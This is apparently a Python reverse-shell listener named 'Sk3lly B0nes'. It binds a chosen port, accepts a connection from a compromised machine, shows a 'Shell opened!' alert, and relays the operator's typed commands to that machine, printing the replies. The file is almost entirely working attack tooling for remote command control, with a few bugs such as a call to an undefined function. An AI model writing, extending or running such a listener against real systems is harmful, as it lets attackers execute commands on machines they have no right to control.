import socket
import sys
import os
from colorama import Fore, Back, Style
import notify2

print(" _____ _    _____ _ _      ______  _____ ")
print("/  ___| |  |____ | | |     | ___ \|  _  | ")
print("\ `--.| | __   / / | |_   _| |_/ /| |/' |_ __   ___  ___ ")
print(" `--. \ |/ /   \ \ | | | | | ___ \|  /| | '_ \ / _ \/ __| ")
print("/\__/ /   <.___/ / | | |_| | |_/ /\ |_/ / | | |  __/\__ \ ")
print("\____/|_|\_\____/|_|_|\__, \____/  \___/|_| |_|\___||___/ ")
print("                       __/ | ")
print("                      |___/ ")

# add more functionality

### Run in background Unix: python3 myfile &

### simply raising the ammount of bytes sent changes things... mess with this and monitor network resources being used 

## Notification settings:
ICON_PATH = "/image/skelly.png"
notify2.init("Sk3lly B0nes")

# Create socket
def gather_bones():
	try:
		global host
		global port
		host =''
		#port = port
		s = socket.socket()
	except socket.error as msg:
		print(Fore.RED + "[☠] Socket creation error: " + str(msg))
		print(Style.RESET_ALL)
	except NameError as msg:
		print(Fore.RED + "[☠] Port not defined!")
		print(Style.RESET_ALL)
		main()


# Bind socket to port and wait for connection
def connect_bones():
	try:
		global host
		global port
		global s
		s = socket.socket()
		print(Fore.BLUE + "[i] Binding socket to port: " + str(port))
		print(Style.RESET_ALL)
		s.bind((host, port))
		s.listen(5) # number of bad connections
	except socket.error as msg:
		print(Fore.RED + "[☠] Socket binding error: " + str(msg) + "\n" + "Retrying...")
		print(Style.RESET_ALL)
		socket_bind()

# Connect
def create_skeleton():
	# socket MUST be listening before it can accept
	conn, address = s.accept()
	print(Fore.BLUE + "[i] Connected to " + address[0] + ':' + str(port))
	print(Style.RESET_ALL)
	n = notify2.Notification("Shell opened!", message = 'Connection succesfully established', icon = ICON_PATH)
	n.set_urgency(notify2.URGENCY_CRITICAL) # low, normal, critical
	n.show()
	send_commands(conn)
	conn.close()

def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
			#sys.exit()
			main()

		# system commands are stored as bytes thats why you must encode them
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(10000), "utf-8")
			print(client_response, end="") # end='': dont give a new line at the end of cmd


def main():
	global port                

	while True:
		try:
			while True:	
				cmd = input("Sk3lly 0.0> ")

				if cmd.lower() == "listen":
					gather_bones()
					connect_bones()
					create_skeleton()
				elif cmd.lower() == "clear":
					os.system('clear')
				elif cmd.lower() == "cls":
					os.system('cls')
					## for windows
				elif cmd[:4].lower() == "port":
					if int(cmd[5:]) > 65353 or int(cmd[5:]) < 1:
						print(Fore.RED + "[☠] You cannot use a port below 1 or above 65353") 
						print(Style.RESET_ALL)
					else:
						port = int(cmd[5:])
						print(Fore.BLUE + "[i] Port set to: " + str(port))
						print(Style.RESET_ALL)
				elif cmd.lower() == "help":
					print("\nlisten - Start listening on specified port")
					print("port - Specify what port to listen on, for example: port 1337")
					print("exit - closes the application")
					print("clear/cls - clears screen (cls for windows, clear for linux)\n")
				elif cmd.lower() == "exit":
					sys.exit()

				else:
					print(Fore.RED + "☠ Get your bones together!! ☠")
					print(Style.RESET_ALL)
		except KeyboardInterrupt:
			print("\n" + Fore.BLUE + "[i] Type exit to close program")
			print(Style.RESET_ALL)
			continue

main()
